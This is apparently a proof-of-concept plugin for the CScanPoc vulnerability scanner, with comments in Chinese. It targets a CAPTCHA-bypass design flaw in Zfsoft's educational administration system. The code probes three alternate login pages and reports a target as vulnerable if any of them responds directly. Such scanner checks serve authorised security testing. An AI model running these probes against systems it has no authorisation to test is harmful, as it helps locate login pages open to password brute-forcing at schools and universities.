# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Zfsoft_0007'  # 平台漏洞编号，留空
    name = '正方教务管理系统 可爆验证码设计缺陷'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-05-05'  # 漏洞公布时间
    desc = '''
        正方现代教学管理系统是一个面向学院各部门以及各层次用户的多模块综合信息管理系，包括教务公共信息维护、学生管理、师资管理、教学计划管理、智能排课、考试管理、选课管理、成绩管理、教材管理、实践管理、收费管理、教学质量评价、毕业生管理、体育管理、实验室管理以及学生综合信息查询、教师网上成绩录入等模块，能够满足从学生入学到毕业全过程及教务管理各个环节的管理需要。系统采用了当前流行的C/S结构和Internet网络技术，使整个校园网甚至Internet上的用户都可访问该系统，最大程度地实现了数据共享，深受广大用户青睐。
        正方教务系统default_ysdx.aspx等文件设计缺陷导致可爆验证码。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '正方教务管理系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'eff596c2-329a-43a4-8046-68438ba58816'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payloads = ['default_ysdx.aspx', 'default6.aspx', 'default5.aspx']

            for payload in payloads:
                url = arg + payload
                _response = requests.get(url)
                if _response.status_code == 200 and url == _response.url:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;url={url}'.format(
                        target=self.target, name=self.vuln.name, url=url))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
